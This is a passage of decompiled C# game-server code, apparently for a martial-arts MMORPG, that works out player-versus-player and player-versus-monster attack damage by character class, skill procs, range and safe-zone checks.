				double num27 = RNG.Next((int)num19 - 15, (int)num19 + 15);
				if (num27 <= 0.0)
				{
					num27 = 0.0;
				}
				else if (!检查毒蛇出洞状态())
				{
					if (base.Player_Job == 2)
					{
						if ((double)RNG.Next(1, 110) <= base.剑_冲冠一怒 && !怒)
						{
							显示大字(base.人物全服ID, 29);
							base.人物_SP += (int)((double)base.人物_SP * base.剑_冲冠一怒 * 0.005);
						}
						if ((double)RNG.Next(1, 100) <= base.剑_移花接木)
						{
							显示大字(base.人物全服ID, 26);
							加血((int)(num27 * 0.5));
						}
					}
					if (base.Player_Job == 9)
					{
						if ((double)RNG.Next(1, 110) <= base.谭_冲冠一怒 && !怒)
						{
							显示大字(base.人物全服ID, 29);
							base.人物_SP += (int)((double)base.人物_SP * base.谭_冲冠一怒 * 0.005);
						}
						if ((double)RNG.Next(1, 100) <= base.谭_移花接木)
						{
							显示大字(base.人物全服ID, 26);
							加血((int)(num27 * 0.5));
						}
					}
				}
				double num28 = RNG.Next((int)num27 - 15, (int)num27 + 15);
				if (num28 <= 1.0)
				{
					num28 = RNG.Next(1, 5);
				}
				else if (中级附魂_愤怒 != 0 && RNG.Next(1, 100) <= 中级附魂_愤怒)
				{
					num28 *= 1.2;
					显示大字(base.人物全服ID, 404);
				}
				int num29;
				if (value13.Player_Job == 11)
				{
					if (value13.梅_障力激活 > 0.0)
					{
						num29 = (int)(num28 * (value13.梅_障力激活 * 0.01));
						if (num29 > value13.人物_AP)
						{
							num29 = value13.人物_AP;
						}
						value13.人物_AP -= num29;
					}
				}
				else
				{
					num29 = 0;
				}
				double num30 = num28 - (double)num29;
				if (base.人物_追加_PVP战力 - value13.人物_追加_PVP战力 > 0)
				{
					int num31 = base.人物_追加_PVP战力 - value13.人物_追加_PVP战力;
					num30 *= 1.0 + 0.01 * (double)num31;
				}
				if (base.人物_追加_PVP战力 - value13.人物_追加_PVP战力 < 0)
				{
					int num32 = base.人物_追加_PVP战力 - value13.人物_追加_PVP战力;
					num30 *= 1.0 - 0.01 * (double)(-num32);
				}
				if (num30 <= 1.0)
				{
					num30 = 1.0;
				}
				if (num30 > 1.0)
				{
					switch (base.Player_Job)
					{
					case 1:
						num30 *= World.刀PK伤害参数;
						break;
					case 2:
						num30 *= World.剑PK伤害参数;
						break;
					case 3:
						num30 *= World.枪PK伤害参数;
						break;
					case 4:
						num30 *= World.弓PK伤害参数;
						break;
					case 5:
						num30 *= World.医PK伤害参数;
						break;
					case 6:
						num30 *= World.刺PK伤害参数;
						break;
					case 7:
						num30 *= World.乐PK伤害参数;
						break;
					case 8:
						num30 *= World.韩PK伤害参数;
						break;
					case 9:
						num30 *= World.谭PK伤害参数;
						break;
					case 10:
						num30 *= World.拳PK伤害参数;
						break;
					case 11:
						num30 *= World.梅PK伤害参数;
						break;
					case 12:
						num30 *= World.卢PK伤害参数;
						break;
					case 13:
						num30 *= World.神女PK伤害参数;
						break;
					}
				}
				if (base.Player_Job == 6)
				{
					switch (num15)
					{
					case 128:
					case 129:
					case 130:
					case 131:
					case 132:
					case 133:
						num30 *= 5.0;
						break;
					case 126:
					case 127:
						num30 *= 2.0;
						break;
					}
				}
				num30 -= (double)(value13.减免对方伤害 + value13.药品减免对方伤害);
				攻击计算完成(this, 人物ID, 武功ID, (int)num30, num15, 0, num29);
				goto end_IL_0003;
				IL_143a:
				num = 17;
				goto IL_1658;
				IL_37bb:
				num = 11;
				float num38 = value13.人物坐标_X - base.人物坐标_X;
				float num39 = value13.人物坐标_Y - base.人物坐标_Y;
				num22 = Math.Sqrt((double)num38 * (double)num38 + (double)num39 * (double)num39);
				switch (base.Player_Job)
				{
				default:
					if (num22 > World.其他职业PK距离)
					{
						return;
					}
					break;
				case 11:
					if (num22 > 70.0 + base.梅_玄武的指点)
					{
						return;
					}
					break;
				case 5:
					if (num22 > World.医生PK距离)
					{
						return;
					}
					break;
				case 4:
					if (num22 > World.弓箭手PK距离 + base.弓_猎鹰之眼)
					{
						return;
					}
					break;
				}
				num = 12;
				if (value13.Player无敌)
				{
					if (自动攻击 != null)
					{
						自动攻击.Stop();
						自动攻击.Enabled = false;
					}
					系统提示("对方刚刚复活, 请慢点攻击。", 50, "系统提示");
					return;
				}
				num = 13;
				num26 = 计算武器四神相克(装备栏已穿装备[3].FLD_FJ_四神之力, value13.装备栏已穿装备[0].FLD_FJ_四神之力);
				int num40 = 计算衣服四神相克(装备栏已穿装备[0].FLD_FJ_四神之力, value13.装备栏已穿装备[3].FLD_FJ_四神之力);
				double num41 = value13.FLD_人物基本_防御;
				num16 = base.FLD_人物基本_攻击;
				num29 = 0;
				num = 14;
				if (num26 == 1)
				{
					num41 -= (double)value13.衣服防御力;
				}
				if (num40 == 1)
				{
					num16 += (double)武器攻击力;
				}
				num17 = num41 * (1.0 - base.FLD_装备_追加_降低百分比防御 - base.武勋降低百分比防御);
				if (!检查毒蛇出洞状态())
				{
					if (base.Player_Job == 1)
					{
						if ((double)RNG.Next(1, 110) <= base.破甲几率)
						{
							显示大字(base.人物全服ID, 16);
							num17 *= 得到气功加成值(1, 5, 1);
						}
					}
					else if (base.Player_Job == 8)
					{
						if ((double)RNG.Next(1, 110) <= base.破甲几率)
						{
							显示大字(base.人物全服ID, 16);
							num17 *= 得到气功加成值(8, 7, 1);
						}
					}
					else if (base.Player_Job == 2)
					{
						double num42 = base.剑_无坚不摧 + base.剑_乘胜追击;
						double num43 = RNG.Next(1, 100);
						if (num43 < base.剑_无坚不摧)
						{
							显示大字(人物ID, 120);
							num17 *= 0.5;
						}
						else if (num43 < num42)
						{
							if (base.剑_乘胜追击 > 0.5)
							{
								base.剑_乘胜追击 = 0.5;
							}
							显示大字(人物ID, 120);
							num17 *= 得到气功加成值(2, 9, 1) - base.剑_乘胜追击 * 0.1;
						}
					}
				}
				num18 = base.FLD_人物基本_命中;
				if (base.Player_Job == 6 && !检查毒蛇出洞状态())
				{
					if (刺_连消带打数量 != 0.0)
					{
						num16 += 刺_连消带打数量 / 2.0;
						刺_连消带打数量 = 0.0;
					}
					if (追加状态列表 != null && GetAddState(801201))
					{
						num18 = (int)((double)num18 * (1.0 + base.刺_先发制人));
					}
				}
				if (!value13.检查毒蛇出洞状态())
				{
					if (value13.Player_Job == 3 && (double)RNG.Next(1, 100) <= value13.枪_转攻为守)
					{
						value13.显示大字(value13.人物全服ID, 130);
						num17 += (double)value13.FLD_攻击 * value13.枪_转攻为守 * 0.005;
					}
					if (value13.Player_Job == 10 && (double)RNG.Next(1, 100) <= value13.拳师_转攻为守)
					{
						value13.显示大字(value13.人物全服ID, 130);
						num17 += (double)value13.FLD_攻击 * value13.拳师_转攻为守 * 0.005;
					}
				}
				num19 = num16 - num17 + (double)num18 * 0.25 - (double)value13.FLD_人物基本_回避 * 0.25;
				int num75 = RNG.Next(0, 1);
				if (1 == 0)
				{
				}
				num66 = num75 switch
				{
					1 => 127, 
					0 => 126, 
					_ => 126, 
				};
				if (1 == 0)
				{
				}
				num15 = num66;
				num = 15;
				if (BitConverter.ToInt32(装备栏已穿装备[3].物品ID, 0) == 0)
				{
					Random random3 = new Random();
					int num76 = RNG.Next(0, 1);
					if (1 == 0)
					{
					}
					num66 = num76 switch
					{
						1 => 113, 
						0 => 112, 
						_ => 112, 
					};
					if (1 == 0)
					{
					}
					int 攻击类型2 = num66;
					double num44 = random3.Next((int)num19 - 15, (int)num19 + 15);
					if (num44 <= 1.0)
					{
						num44 = RNG.Next(1, 5);
					}
					if (value13.Player_Job == 11)
					{
						if (value13.梅_障力激活 > 0.0)
						{
							num29 = (int)(num44 * (value13.梅_障力激活 * 0.01));
							if (num29 > value13.人物_AP)
							{
								num29 = value13.人物_AP;
							}
							value13.人物_AP -= num29;
						}
					}
					else
					{
						num29 = 0;
					}
					double num46 = num44 - (double)num29;
					if (num46 <= 1.0)
					{
						num46 = 1.0;
					}
					攻击计算完成(this, 人物ID, 武功ID, (int)num46, 攻击类型2, 0, num29);
					return;
				}
				if (base.Player_Job == 2)
				{
					double num47 = RNG.Next(1, 110);
					if (检查毒蛇出洞状态())
					{
						num47 *= 1000.0;
					}
					if (num47 < base.剑_怒海狂澜)
					{
						num19 *= 得到气功加成值(2, 7, 1);
					}
					goto IL_1658;
				}
				if (base.Player_Job == 4)
				{
					if (value13.检查烈日炎炎状态() && BitConverter.ToInt32(value13.装备栏已穿装备[0].物品ID, 0) != 0)
					{
						num41 -= (double)value13.装备栏已穿装备[0].物品防御力;
					}
					int num48 = RNG.Next(1, 130);
					int num49 = RNG.Next(1, 110);
					int num50 = RNG.Next(1, 130);
					int num51 = RNG.Next(1, 130);
					num19 = (num16 - num41 * 0.7) * World.弓手攻击倍数 + (double)(base.FLD_人物基本_命中 / 4) - (double)(value13.FLD_人物基本_回避 / 4) + (double)(base.人物_追加_PVP战力 * 10);
					if (检查毒蛇出洞状态())
					{
						num51 *= 1000;
						num48 *= 1000;
						num49 *= 1000;
						num50 *= 1000;
					}
					if ((double)num48 <= base.弓_心神凝聚)
					{
						num15 = 136;
						num19 *= 3.0;
					}
					else if ((double)num49 <= base.弓_流星三矢 + base.弓_升天一气功_绝影射魂 + base.弓_流星三矢概率)
					{
						显示大字(base.人物全服ID, 47);
						if (追加状态列表.ContainsKey(700047))
						{
							追加状态列表[700047].时间结束事件();
						}
						追加状态类 追加状态类3 = new 追加状态类(this, base.弓_流星三矢时间, 700047.0, 1.0);
						追加状态列表.Add(追加状态类3.FLD_PID, 追加状态类3);
						状态效果(BitConverter.GetBytes(700047), 1, (int)base.弓_流星三矢时间);
						更新武功和状态();
						if (追加状态列表.ContainsKey(700047))
						{
							num19 *= 1.45;
							num15 = 129;
							base.弓_流星三矢概率 = 30.0;
						}
					}
					else
					{
						switch (RNG.Next(0, 4))
						{
						default:
							num15 = 126;
							break;
						case 1:
							num15 = 126;
							break;
						case 2:
							num15 = 126;
							break;
						case 3:
							num15 = 127;
							break;
						case 4:
							num15 = 128;
							num19 = 1.2;
							break;
						}
					}
					if ((double)num50 <= base.弓_致命绝杀)
					{
						_ = base.弓_致命绝杀;
						得到气功加成值(4, 11, 1);
						num19 *= 1.4;
						显示大字(base.人物全服ID, 140);
						触发弓箭致命绝杀 = true;
					}
					num19 += base.弓_锐利之箭 + 1.0;
					if ((double)num51 <= base.弓_无明暗矢)
					{
						num19 *= 1.05 + base.弓_无明暗矢 * 0.005;
						显示大字(人物ID, 49);
						触发物理无明暗矢 = true;
					}
					if ((double)RNG.Next(1, 100) <= base.升天五式_千里一击)
					{
						num19 *= 1.0 + base.升天五式_千里一击 * 2.0 / 100.0;
						显示大字(base.人物全服ID, 1017);
					}
					goto IL_1658;
				}
				if (base.Player_Job == 6)
				{
					if (value13.检查烈日炎炎状态() && BitConverter.ToInt32(value13.装备栏已穿装备[0].物品ID, 0) != 0)
					{
						num41 -= (double)value13.装备栏已穿装备[0].物品防御力;
					}
					num19 = (num16 - num41 * 0.8) * World.刺客攻击倍数 + (double)(base.FLD_人物基本_命中 / 4) - (double)(value13.FLD_人物基本_回避 / 4) + (double)(base.人物_追加_PVP战力 * 10);
					int num52 = RNG.Next(1, 130);
					int num53 = RNG.Next(1, 130);
					if (检查毒蛇出洞状态())
					{
						num52 *= 1000;
						num53 *= 1000;
					}
					double num54 = base.刺_心神凝聚;
					if (base.当前激活技能ID != 0 && base.当前激活技能ID != 830401 && base.当前激活技能ID != 840401 && num54 != 0.0)
					{
						num54 += 20.0;
					}
					if ((double)num53 <= num54)
					{
						num15 = 136;
						num19 *= 6.0;
						if (base.刺_致手绝命 != 0.0)
						{
							num19 += num19 * base.刺_致手绝命;
						}
					}
					else if ((double)num52 <= base.刺_以怒还怒)
					{
						显示大字(base.人物全服ID, 372);
						num15 = 134;
						num19 *= 1.3;
						if ((double)RNG.Next(1, 100) <= base.刺_一招残杀)
						{
							显示大字(base.人物全服ID, 1022);
							num19 *= 1.4;
						}
					}
					else
					{
						int num55 = RNG.Next(1, 120);
						if (检查毒蛇出洞状态())
						{
							num55 *= 1000;
						}
						if ((double)num55 <= base.刺_连环飞舞)
						{
							显示大字(base.人物全服ID, 272);
							int num77 = RNG.Next(0, 5);
							if (1 == 0)
							{
							}
							num66 = num77 switch
							{
								1 => 129, 
								2 => 130, 
								3 => 131, 
								4 => 132, 
								5 => 133, 
								_ => 129, 
							};
							if (1 == 0)
							{
							}
							num15 = num66;
							num19 = 1.4;
							num = 16;
						}
					}
					if (base.刺_升天三气功_无情打击 != 0.0)
					{
						num19 += num16 * base.刺_升天三气功_无情打击;
					}
					if (base.当前激活技能ID == 0 || !World.TBL_KONGFU.TryGetValue(base.当前激活技能ID, out var value3))
					{
						goto IL_143a;
					}
					if (value3.FLD_武功类型 == 3)
					{
						int num57 = value3.FLD_MP + (武功新[3, value3.FLD_INDEX].武功_等级 - 1) * 武功新[3, value3.FLD_INDEX].FLD_每级加MP;
						if (base.人物_MP >= num57)
						{
							num37 = value3.FLD_AT + (武功新[3, value3.FLD_INDEX].武功_等级 - 1) * value3.FLD_每级加危害 / World.升天技能等级加成;
							魔法使用(num57);
							goto IL_3733;
						}
						发送激活技能数据(value3.FLD_PID, 2);
					}
					else
					{
						if (base.人物_MP >= value3.FLD_MP)
						{
							num37 = value3.FLD_AT;
							魔法使用(value3.FLD_MP);
							goto IL_3733;
						}
						发送激活技能数据(value3.FLD_PID, 2);
					}
					return;
				}
				if (base.Player_Job == 7)
				{
					int num78 = RNG.Next(0, 5);
					if (1 == 0)
					{
					}
					num66 = num78 switch
					{
						1 => 126, 
						2 => 129, 
						3 => 134, 
						_ => 126, 
					};
					if (1 == 0)
					{
					}
					num15 = num66;
					if (!检查和弦状态())
					{
						if ((double)RNG.Next(1, 100) < base.琴师_梅花三弄)
						{
							显示大字(人物ID, 87);
							int num58 = random.Next(900401, 900404);
							追加状态类 value4 = new 追加状态类(this, 10000, num58, 0);
							追加状态列表.Add(num58, value4);
							状态效果(BitConverter.GetBytes(num58), 1, 10000);
							更新人物数据(this);
						}
					}
					else if (追加状态列表.ContainsKey(900401))
					{
						if (random.NextDouble() < base.琴_三和弦_状态效果)
						{
							if (random.Next(10, 12) == 10)
							{
								if (!value13.异常状态.ContainsKey(10))
								{
									异常状态类 异常状态类3 = new 异常状态类(value13, 10000, 10, num19);
									异常状态类3.异常状态类出血(num19);
									value13.异常状态.Add(10, 异常状态类3);
								}
							}
							else if (!value13.异常状态.ContainsKey(11))
							{
								异常状态类 value5 = new 异常状态类(value13, 10000, 11, 0.0);
								value13.异常状态.Add(11, value5);
							}
						}
						if (random.NextDouble() < base.琴师_阳明春晓 && !value13.异常状态.ContainsKey(1))
						{
							double num59 = 10000.0 + base.琴师_阳明春晓 * 100000.0;
							异常状态类 value6 = new 异常状态类(value13, (int)num59, 1, base.琴师_阳明春晓 * 0.016);
							value13.异常状态.Add(1, value6);
							value13.FLD_药品_减少攻击 -= base.琴师_阳明春晓 * 0.016;
						}
						if (random.NextDouble() < base.琴师_潇湘雨夜 && !value13.异常状态.ContainsKey(2))
						{
							double num60 = 10000.0 + base.琴师_潇湘雨夜 * 100000.0;
							异常状态类 value7 = new 异常状态类(value13, (int)num60, 2, base.琴师_潇湘雨夜 * 0.016);
							value13.异常状态.Add(2, value7);
							value13.FLD_药品_减少防御 -= base.琴师_潇湘雨夜 * 0.016;
						}
					}
					else
					{
						追加状态列表.ContainsKey(900402);
					}
				}
				else if (base.Player_Job == 9)
				{
					double num61 = RNG.Next(1, 110);
					if (检查毒蛇出洞状态())
					{
						num61 *= 1000.0;
					}
					if (num61 < base.谭_怒海狂澜)
					{
						num19 *= 得到气功加成值(9, 10, 1);
					}
				}
				else if (base.Player_Job == 11)
				{
					if ((value13.Player_Job == 2 || value13.Player_Job == 9) && base.梅_嫉妒的化身 > 0.0 && (double)RNG.Next(1, 100) <= base.梅_嫉妒的化身)
					{
						num19 *= 1.0 + 得到气功加成值(base.Player_Job, 9, 1);
						显示大字(base.人物全服ID, 808);
					}
					if ((double)RNG.Next(1, 100) <= base.梅_升天一气功_玄武雷电)
					{
						num19 *= 1.4;
						显示大字(base.人物全服ID, 803);
					}
					if (base.人物坐标_地图 != 7301 && (double)RNG.Next(1, 100) <= base.梅_升天二气功_玄武诅咒)
					{
						num19 += (double)base.人物最大_HP * 0.2;
						显示大字(base.人物全服ID, 806);
					}
				}
				goto IL_1658;
				IL_1443:
				num = 7;
				if (base.人物坐标_地图 != 801 && base.人物坐标_地图 != 8001 && base.人物坐标_地图 != 41001 && base.人物坐标_地图 != 7301 && base.人物坐标_地图 != 42001 && Math.Abs(base.Player_Level - value13.Player_Level) > World.PK等级差)
				{
					系统提示("等级差" + World.PK等级差 + "级以上，不能攻击。");
					return;
				}
				num = 8;
				if (value13.人物坐标_地图 == 2301 || base.人物坐标_地图 == 2301 || base.人物坐标_地图 == 7301 || value13.人物坐标_地图 == 7301 || value13.人物坐标_地图 == 41001 || base.人物坐标_地图 == 41001 || value13.人物坐标_地图 == 801 || base.人物坐标_地图 == 801 || value13.人物坐标_地图 == 42001 || base.人物坐标_地图 == 42001)
				{
					goto IL_37bb;
				}
				if (value13.检查玩家是否在挂机双倍区域(this) && value13.追加状态列表.ContainsKey(900000619))
				{
					value13.安全模式 = 0;
				}
				else if (!value13.检查玩家是否在挂机双倍区域(this) && value13.追加状态列表.ContainsKey(900000619))
				{
					value13.安全模式 = 1;
				}
				if (value13.安全模式 == 1 && !value13.安全区禁止下毒(this))
				{
					系统提示("对方处于安全模式中, 禁止攻击。");
					return;
				}
				if (安全模式 == 1 && !安全区禁止下毒(this))
				{
					系统提示("处于安全模式中, 禁止攻击。");
					return;
				}
				if (!触发新手安全区(this) && !触发新手安全区(value13))
				{
					goto IL_37bb;
				}
				系统提示("安全区域中禁止PK。");
				goto end_IL_0003;
				IL_2a10:
				if (base.Player_Job == 1)
				{
					if ((double)RNG.Next(1, 80) <= base.刀_连环飞舞)
					{
						int num33 = RNG.Next(0, 10);
						num63 = ((num56 - num12) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						switch (num33)
						{
						case 1:
							num64 = 129;
							break;
						case 2:
							num64 = 130;
							break;
						case 3:
							num64 = 131;
							break;
						case 4:
							num64 = 132;
							break;
						case 5:
							num64 = 133;
							break;
						default:
							num64 = 129;
							break;
						case 7:
							num64 = 128;
							break;
						case 8:
							num64 = 134;
							num63 = ((num56 - num12) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.5;
							break;
						}
					}
				}
				else if (base.Player_Job == 2)
				{
					if ((double)RNG.Next(1, 80) <= base.剑_连环飞舞)
					{
						int num35 = RNG.Next(0, 10);
						num63 = ((num56 - num12) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						switch (num35)
						{
						case 1:
							num64 = 129;
							break;
						case 2:
							num64 = 130;
							break;
						case 3:
							num64 = 131;
							break;
						case 4:
							num64 = 132;
							break;
						case 5:
							num64 = 133;
							break;
						default:
							num64 = 129;
							break;
						case 7:
							num64 = 128;
							break;
						case 8:
							num64 = 134;
							num63 = ((num56 - num12) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.5;
							break;
						}
					}
				}
				else if (base.Player_Job == 3)
				{
					if ((double)RNG.Next(1, 80) <= base.枪_连环飞舞)
					{
						num63 = ((num56 - num12) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						switch (RNG.Next(0, 10))
						{
						case 1:
							num64 = 129;
							break;
						case 2:
							num64 = 130;
							break;
						case 3:
							num64 = 131;
							break;
						case 4:
							num64 = 132;
							break;
						case 5:
							num64 = 133;
							break;
						default:
							num64 = 129;
							break;
						case 7:
							num64 = 128;
							break;
						case 8:
							num64 = 134;
							num63 = ((num56 - num12) * 1.5 + (double)base.FLD_人物基本_命中 / 4.0) * 2.5;
							break;
						}
					}
				}
				else if (base.Player_Job == 5)
				{
					int num79 = RNG.Next(0, 6);
					if (1 == 0)
					{
					}
					num66 = num79 switch
					{
						1 => 126, 
						2 => 126, 
						3 => 127, 
						6 => 127, 
						_ => 126, 
					};
					if (1 == 0)
					{
					}
					num64 = num66;
				}
				else if (base.Player_Job == 7)
				{
					switch (RNG.Next(0, 10))
					{
					case 1:
						num64 = 126;
						break;
					case 2:
						num64 = 126;
						break;
					case 3:
						num64 = 127;
						break;
					case 4:
						num63 = ((num56 - num12) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						num64 = 128;
						break;
					case 5:
						num63 = ((num56 - num12) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						num64 = 129;
						break;
					case 6:
						num63 = ((num56 - num12) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						num64 = 130;
						break;
					default:
						num64 = 126;
						break;
					case 8:
						num63 = ((num56 - num12) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						num64 = 132;
						break;
					case 9:
						num63 = ((num56 - num12) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						num64 = 133;
						break;
					case 10:
						num64 = 134;
						num63 = ((num56 - num12) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.5;
						break;
					}
				}
				else if (base.Player_Job == 11)
				{
					switch (RNG.Next(0, 6))
					{
					default:
						num64 = 126;
						break;
					case 1:
						num64 = 126;
						break;
					case 2:
						num64 = 126;
						break;
					case 3:
						num64 = 127;
						break;
					case 4:
						num64 = 128;
						num63 = ((num56 - num12) * 1.5 + (double)base.FLD_人物基本_命中 * 0.25) * 2.0;
						break;
					case 5:
						num64 = 134;
						num63 = ((num56 - num12) * 1.5 + (double)base.FLD_人物基本_命中 * 0.25) * 2.5;
						break;
					}
				}
				else if (base.Player_Job == 13)
				{
					int num80 = RNG.Next(0, 6);
					if (1 == 0)
					{
					}
					num66 = num80 switch
					{
						1 => 126, 
						2 => 126, 
						3 => 127, 
						6 => 127, 
						_ => 126, 
					};
					if (1 == 0)
					{
					}
					num64 = num66;
				}
				else if (base.Player_Job > 7)
				{
					switch (RNG.Next(0, 10))
					{
					default:
						num64 = 126;
						break;
					case 1:
						num64 = 126;
						break;
					case 2:
						num64 = 127;
						break;
					case 3:
						num64 = 128;
						num63 = ((num56 - num12) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						break;
					case 4:
						num64 = 128;
						num63 = ((num56 - num12) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						break;
					case 5:
						num64 = 129;
						num63 = ((num56 - num12) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						break;
					case 6:
						num64 = 130;
						num63 = ((num56 - num12) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						break;
					case 7:
						num64 = 131;
						num63 = ((num56 - num12) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						break;
					case 8:
						num64 = 132;
						num63 = ((num56 - num12) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						break;
					case 9:
						num64 = 133;
						num63 = ((num56 - num12) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.0;
						break;
					case 10:
						num64 = 134;
						num63 = ((num56 - num12) * 1.5 + (double)(base.FLD_人物基本_命中 / 4)) * 2.5;
						break;
					}
				}
				if (base.FLD_装备_追加_中毒概率百分比 > 0.0 && (double)RNG.Next(1, 100) <= base.FLD_装备_追加_中毒概率百分比 && !value.ContainsKeyInAbnormalState(3))
				{
					异常状态类 value2 = new 异常状态类(value, value.FLD_INDEX, 60000, 3, 0.0);
					value.异常状态.TryAdd(3, value2);
				}
				num = 5;
				double num36 = (double)RNG.Next((int)num63 - 15, (int)num63 + 15) + (double)装备追加对怪攻击 + (double)药品追加对怪攻击 + (double)强化追加对怪攻击;
				if (num36 <= 0.0)
				{
					num36 = RNG.Next(1, 5);
				}
				else
				{
					if (base.Player_Job == 2)
					{
						if ((double)RNG.Next(1, 110) <= base.剑_冲冠一怒 && !怒)
						{
							显示大字(base.人物全服ID, 29);
							base.人物_SP += (int)((double)base.人物_SP * base.剑_冲冠一怒 * 0.005);
						}
						if ((double)RNG.Next(1, 100) <= base.剑_移花接木)
						{
							显示大字(base.人物全服ID, 26);
							加血((int)(num36 * 0.5));
						}
					}
					if (base.Player_Job == 9)
					{
						if ((double)RNG.Next(1, 110) <= base.谭_冲冠一怒 && !怒)
						{
							显示大字(base.人物全服ID, 29);
							base.人物_SP += (int)((double)base.人物_SP * base.谭_冲冠一怒 * 0.005);
						}
						if ((double)RNG.Next(1, 100) <= base.谭_移花接木)
						{
							显示大字(base.人物全服ID, 26);
							加血((int)(num36 * 0.5));
						}
					}
				}
				if (num36 <= 1.0)
				{
					num36 = RNG.Next(1, 5);
				}
				if (base.Player_Job == 6)
				{
					switch (num64)
					{
					case 128:
					case 129:
					case 130:
					case 131:
					case 132:
					case 133:
						num36 *= 5.0;
						break;
					case 126:
					case 127:
						num36 *= 2.0;
						break;
					}
				}
				if (num36 > 1.0)
				{
					switch (base.Player_Job)
					{
					case 1:
						num36 *= World.刀对怪物伤害 + 宠物对怪物伤害;
						break;
					case 2:
						num36 *= World.剑对怪物伤害 + 宠物对怪物伤害;
						break;
					case 3:
						num36 *= World.枪对怪物伤害 + 宠物对怪物伤害;
						break;
					case 4:
						num36 *= World.弓对怪物伤害 + 宠物对怪物伤害;
						break;
					case 5:
						num36 *= World.医对怪物伤害 + 宠物对怪物伤害;
						break;
					case 6:
						num36 *= World.刺对怪物伤害 + 宠物对怪物伤害;
						break;
					case 7:
						num36 *= World.琴对怪物伤害 + 宠物对怪物伤害;
						break;
					case 8:
						num36 *= World.韩对怪物伤害 + 宠物对怪物伤害;
						break;
					case 9:
						num36 *= World.谭对怪物伤害 + 宠物对怪物伤害;
						break;
					case 10:
						num36 *= World.拳对怪物伤害 + 宠物对怪物伤害;
						break;
					case 11:
						num36 *= World.梅对怪物伤害 + 宠物对怪物伤害;
						break;
					case 12:
						num36 *= World.卢对怪物伤害 + 宠物对怪物伤害;
						break;
					case 13:
						num36 *= World.神女对怪物伤害 + 宠物对怪物伤害;
						break;
					}
				}
				攻击计算完成(this, 人物ID, 武功ID, (int)num36, num64, value.Rxjh_HP, 0);
				goto end_IL_0003;
				IL_3777:
				num63 = ((base.当前激活技能ID == 830401 || base.当前激活技能ID == 840401) ? (num63 + (double)num7 * 0.5) : (num63 + (double)num7 * 0.25));
				goto IL_2a10;
				end_IL_0003:;
			}
			catch (Exception ex)
			{
				if (自动攻击 != null)
				{
					自动攻击.Stop();
					自动攻击.Enabled = false;
					自动攻击.Close();
					自动攻击.Dispose();
					自动攻击 = null;
				}
				报错次数阀值++;
				if (World.是否开启票红字 == 1)
				{
					系统提示("你物理攻击出错, 请联系客服处理");
					MainForm.WriteLine(1, "物理攻击|" + num + "|" + base.人物全服ID + "|" + ToString() + "|" + base.UserName + "|" + 报错次数阀值 + "丨" + ex.Message);
				}
			}
		}

		public void 攻击计算(武功类 武功, NpcClass npcTemp, int 武功ID, int 人物ID, int 临时武功)
		{
			int num = 0;
			try
			{
				Random random = new Random();
				num = 1;
				if (武功ID == 3000401 && !npcTemp.ContainsKeyInAbnormalState(4))
				{
					double num12 = 3000.0;
					异常状态类 value = new 异常状态类(npcTemp, base.人物全服ID, (int)num12, 4, 0.0);
					npcTemp.异常状态.TryAdd(4, value);
					发送攻击人物数据(this, 人物ID, 武功ID, 1, 126, npcTemp.Rxjh_HP, 0, 0);
					return;
				}
				if (武功ID == 6002205 && !npcTemp.ContainsKeyInAbnormalState(44) && base.Player_Level > 武功.FLD_LEVEL)
				{
					npcTemp.怪物阎王爆 = true;
					异常状态类 value4 = new 异常状态类(this, npcTemp, base.人物全服ID, 8000, 44, 0.0);
					npcTemp.异常状态.TryAdd(44, value4);
					发送攻击人物数据(this, 人物ID, 武功ID, 0, 126, npcTemp.Rxjh_HP, 0, 0);
					return;
				}
				double num23 = npcTemp.FLD_DF * World.怪物防御百分比;
				double num32 = base.FLD_人物基本_攻击;
				if (base.陵劲淬砺 > 0.0 && base.陵劲淬砺 >= (double)RNG.Next(1, 100))
				{
					num32 += num32 * ((double)装备栏已穿装备[3].物品属性阶段数 * 0.005 * 2.0);
					显示大字(base.人物全服ID, 1011);
				}
				if (base.FLD_装备_追加_降低百分比防御 > 0.0)
				{
					num23 *= 1.0 - base.FLD_装备_追加_降低百分比防御 - base.武勋降低百分比防御;
				}
				if (npcTemp.FLD_BOSS == 0 && 中级附魂_复仇 != 0 && RNG.Next(1, 100) <= 中级附魂_复仇)
				{
					显示大字(base.人物全服ID, 401);
					npcTemp.发送复仇显示伤害血量(npcTemp.Max_Rxjh_HP / 3);
					npcTemp.Rxjh_HP -= (int)((double)npcTemp.Max_Rxjh_HP * 0.3);
					npcTemp.Play_Hit(this, (int)((double)npcTemp.Max_Rxjh_HP * 0.3));
					if (npcTemp.Rxjh_HP <= 0 && !npcTemp.NPC死亡)
					{
						npcTemp.发送死亡数据(base.人物全服ID);
					}
				}
				num = 2;
				if (base.Player_Job == 1)
				{
					if ((double)RNG.Next(1, 110) <= base.破甲几率)
					{
						num23 *= 得到气功加成值(1, 5, 1);
						显示大字(base.人物全服ID, 16);
					}
				}
				else if (base.Player_Job == 2)
				{
					double num33 = base.剑_无坚不摧 + base.剑_乘胜追击;
					double num34 = RNG.Next(1, 100);
					if (num34 < base.剑_无坚不摧)
					{
						显示大字(人物ID, 120);
						num23 *= 0.5;
					}
					else if (num34 < num33)
					{
						if (base.剑_乘胜追击 > 0.5)
						{
							base.剑_乘胜追击 = 0.5;
						}
						显示大字(人物ID, 120);
						num23 *= 得到气功加成值(2, 9, 1) - base.剑_乘胜追击 * 0.1;
					}
				}
